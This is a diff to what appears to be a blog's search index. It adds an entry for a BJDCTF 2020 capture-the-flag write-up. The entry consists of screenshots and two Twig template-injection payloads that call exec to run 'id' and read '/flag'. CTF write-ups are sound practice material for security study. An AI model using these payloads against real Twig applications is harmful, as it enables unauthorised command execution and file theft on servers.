@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>BJDCTF:2020-CookieIsSoStable</title>
+      <link href="2021/07/03/bjdctf-2020-cookieissostable/"/>
+      <url>2021/07/03/bjdctf-2020-cookieissostable/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/07/03/bjdctf-2020-cookieissostable/image-20210709222509040.png" alt="image-20210709222509040"></p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}{{{_self.env.getFilter("id")}}</code></pre><p><img src="/2021/07/03/bjdctf-2020-cookieissostable/image-20210709221716988.png" alt="image-20210709221716988"></p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p><img src="/2021/07/03/bjdctf-2020-cookieissostable/image-20210709222027216.png" alt="image-20210709222027216"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ASIS:2019-UnicornShop</title>
       <link href="2021/07/03/asis-2019-unicornshop/"/>
       <url>2021/07/03/asis-2019-unicornshop/</url>
